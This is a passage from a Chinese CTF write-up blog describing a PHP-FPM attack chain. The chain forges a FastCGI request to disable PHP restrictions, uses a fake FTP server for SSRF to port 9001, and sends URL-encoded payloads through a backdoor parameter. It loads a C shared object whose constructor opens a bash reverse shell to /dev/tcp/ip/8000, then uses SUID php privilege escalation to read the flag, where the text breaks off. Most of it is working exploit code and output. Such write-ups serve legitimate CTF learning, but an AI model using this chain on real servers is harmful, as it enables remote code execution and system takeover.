                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
            <span class="p">}</span>
            <span class="nv">$vlen</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$vlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
            <span class="p">}</span>
            <span class="nv">$array</span><span class="p">[</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$nlen</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="o">+</span><span class="nv">$nlen</span><span class="p">,</span> <span class="nv">$vlen</span><span class="p">);</span>
            <span class="nv">$p</span> <span class="o">+=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">+</span> <span class="nv">$vlen</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">decodePacketHeader</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;version&#39;</span><span class="p">]</span>       <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>          <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;requestId&#39;</span><span class="p">]</span>     <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">3</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">4</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">5</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">6</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;reserved&#39;</span><span class="p">]</span>      <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">7</span><span class="p">});</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">readPacket</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$packet</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">HEADER_LEN</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$resp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">decodePacketHeader</span><span class="p">(</span><span class="nv">$packet</span><span class="p">);</span>
            <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$len</span>  <span class="o">=</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">];</span>
                <span class="k">while</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">&amp;&amp;</span> <span class="nv">$buf</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$len</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$len</span> <span class="o">-=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$buf</span><span class="p">);</span>
                    <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$buf</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$buf</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$resp</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getValues</span><span class="p">(</span><span class="k">array</span> <span class="nv">$requestedInfo</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">();</span>
        <span class="nv">$request</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$requestedInfo</span> <span class="k">as</span> <span class="nv">$info</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildNvpair</span><span class="p">(</span><span class="nv">$info</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">GET_VALUES</span><span class="p">,</span> <span class="nv">$request</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
        <span class="nv">$resp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readPacket</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">self</span><span class="o">::</span><span class="na">GET_VALUES_RESULT</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readNvpair</span><span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">],</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;length&#39;</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">request</span><span class="p">(</span><span class="k">array</span> <span class="nv">$params</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$response</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="c1">//        $this-&gt;connect();
</span><span class="c1"></span>        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">BEGIN_REQUEST</span><span class="p">,</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">RESPONDER</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span><span class="p">)</span> <span class="o">.</span> <span class="nx">str_repeat</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">5</span><span class="p">));</span>
        <span class="nv">$paramsRequest</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$paramsRequest</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildNvpair</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$paramsRequest</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="nv">$paramsRequest</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$stdin</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;?file=ftp://ip:9999/&amp;data=&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="nv">$request</span><span class="p">));</span>

    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">&lt;?php
</span><span class="err">// real exploit start here
</span><span class="err">//if (!isset($_REQUEST[&#39;cmd&#39;])) {
</span><span class="err">//    die(&#34;Check your input\n&#34;);
</span><span class="err">//}
</span><span class="err">//if (!isset($_REQUEST[&#39;filepath&#39;])) {
</span><span class="err">//    $filepath = __FILE__;
</span><span class="err">//}else{
</span><span class="err">//    $filepath = $_REQUEST[&#39;filepath&#39;];
</span><span class="err">//}
</span><span class="err">
</span><span class="err">$filepath = &#34;/var/www/html/add_api.php&#34;;
</span><span class="err">$req = &#39;/&#39;.basename($filepath);
</span><span class="err">$uri = $req .&#39;?&#39;.&#39;command=whoami&#39;;
</span><span class="err">$client = new FCGIClient(&#34;unix:///var/run/php-fpm.sock&#34;, -1);
</span><span class="err">$code = &#34;&lt;?php system(\$_REQUEST[&#39;command&#39;]); phpinfo(); ?&gt;&#34;; // php payload -- Doesnt do anything
</span><span class="err">$php_value = &#34;unserialize_callback_func = system\nextension_dir = /var/www/html\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#34;; // extension_dir即为.so文件所在目录
</span><span class="err">$params = array(
</span><span class="err">    &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
</span><span class="err">    &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
</span><span class="err">    &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
</span><span class="err">    &#39;SCRIPT_NAME&#39;       =&gt; $req,
</span><span class="err">    &#39;QUERY_STRING&#39;      =&gt; &#39;command=whoami&#39;,
</span><span class="err">    &#39;REQUEST_URI&#39;       =&gt; $uri,
</span><span class="err">    &#39;DOCUMENT_URI&#39;      =&gt; $req,
</span><span class="err">#&#39;DOCUMENT_ROOT&#39;     =&gt; &#39;/&#39;,
</span><span class="err">    &#39;PHP_VALUE&#39;         =&gt; $php_value,
</span><span class="err">    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;80sec/wofeiwo&#39;,
</span><span class="err">    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span><span class="err">    &#39;REMOTE_PORT&#39;       =&gt; &#39;9001&#39;, // 找准服务端口
</span><span class="err">    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span><span class="err">    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
</span><span class="err">    &#39;SERVER_NAME&#39;       =&gt; &#39;localhost&#39;,
</span><span class="err">    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
</span><span class="err">    &#39;CONTENT_LENGTH&#39;    =&gt; strlen($code)
</span><span class="err">);
</span><span class="err">// print_r($_REQUEST);
</span><span class="err">// print_r($params);
</span><span class="err">//echo &#34;Call: $uri\n\n&#34;;
</span><span class="err">echo $client-&gt;request($params, $code).&#34;\n&#34;;
</span><span class="err">?&gt;
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png" alt="image-20210505184651947"></p>
<p>然后在vps上起ftp：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;220 welcome</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#Service ready for new user.</span>
<span class="c1">#Client send anonymous username</span>
<span class="c1">#USER anonymous</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;331 Please specify the password.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#User name okay, need password.</span>
<span class="c1">#Client send anonymous password.</span>
<span class="c1">#PASS anonymous</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;230 Login successful.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#User logged in, proceed. Logged out if appropriate.</span>
<span class="c1">#TYPE I</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;200 Switching to Binary mode.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#Size /</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;550 Could not get the file size.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#EPSV (1)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;150 ok</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#PASV</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#STOR / (2) 注意打到9001端口的服务</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;150 Permission denied.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#QUIT</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;221 Goodbye.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/add_api.php?backdoor<span class="o">=</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;&amp;</span><span class="nv">file</span><span class="o">=</span>ftp://ip:12345/<span class="p">&amp;</span><span class="nv">data</span><span class="o">=</span>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
</code></pre></div><p>打过去，看vps上的ftp断开，说明对话成功，回头看一眼<strong>phpinfo()</strong>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png" alt="image-20210505185334445"></p>
<p>后面就好说了，然鹅当我打开蚁剑，发现还是什么也动不了，命令执行还是和之前一模一样&hellip;我傻了</p>
<p>翻阅资料才发现伪造FastCGI请求PHP-CGI本身就是一次性的，相当于执行一次命令(之前gopher打ssrf那个脚本也是同理)，那最好的办法当然还是加载.so去打ssrf了&hellip;</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">hack</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/8000 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gcc theoyu.c -shared -o theoyu.so 
</code></pre></div><p>把theoyu.so传到/var/www/html 目录后，再把之前脚本的php_value改为：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$php_value</span> <span class="o">=</span> <span class="s2">&#34;unserialize_callback_func = system</span><span class="se">\n</span><span class="s2">extension_dir = /var/www/html</span><span class="se">\n</span><span class="s2">extension = theoyu.so</span><span class="se">\n</span><span class="s2">disable_classes = </span><span class="se">\n</span><span class="s2">disable_functions = </span><span class="se">\n</span><span class="s2">allow_url_include = On</span><span class="se">\n</span><span class="s2">open_basedir = /</span><span class="se">\n</span><span class="s2">auto_prepend_file = &#34;</span><span class="p">;</span> <span class="c1">// extension_dir即为.so文件所在目录
</span></code></pre></div><pre><code>/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&amp;file=ftp://ip:12345/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02G%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+theoyu.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
</code></pre><p>同时vps打开监听，反弹成功后终于可以动了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png" alt="image-20210505204851091"></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ ls -al
total <span class="m">8</span>
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 .
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 ..
-rwxr-xr-x    <span class="m">1</span> root root    <span class="m">0</span> May  <span class="m">5</span> 09:53 .dockerenv
drwxr-xr-x    <span class="m">1</span> root root  <span class="m">179</span> Apr <span class="m">29</span> 14:53 bin
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Mar <span class="m">19</span> 23:44 boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">340</span> May  <span class="m">5</span> 09:53 dev
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">66</span> May  <span class="m">5</span> 09:53 etc
-rwx------    <span class="m">1</span> root root   <span class="m">43</span> May  <span class="m">5</span> 09:53 flag
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Mar <span class="m">19</span> 23:44 home
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">45</span> Apr <span class="m">29</span> 14:53 lib
drwxr-xr-x    <span class="m">2</span> root root   <span class="m">34</span> Apr  <span class="m">8</span> 00:00 lib64
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 media
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 mnt
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 opt
dr-xr-xr-x <span class="m">2312</span> root root    <span class="m">0</span> May  <span class="m">5</span> 09:53 proc
drwx------    <span class="m">1</span> root root    <span class="m">6</span> Apr <span class="m">29</span> 15:13 root
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">23</span> May  <span class="m">5</span> 09:53 run
drwxr-xr-x    <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span> 00:00 sbin
drwxr-xr-x    <span class="m">2</span> root root    <span class="m">6</span> Apr  <span class="m">8</span> 00:00 srv
dr-xr-xr-x   <span class="m">13</span> root root    <span class="m">0</span> May  <span class="m">5</span> 04:25 sys
drwxrwxrwt    <span class="m">1</span> root root    <span class="m">6</span> May  <span class="m">5</span> 12:40 tmp
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">19</span> Apr  <span class="m">8</span> 00:00 usr
drwxr-xr-x    <span class="m">1</span> root root   <span class="m">39</span> Apr <span class="m">29</span> 14:53 var
</code></pre></div><p>但是发现 <strong>/flag</strong>还是不能读取，之后就是一个简单的suid提权。</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null

/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/local/bin/php
</code></pre></div><p>发现php就有s权限，直接写一个php执行读取即可。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
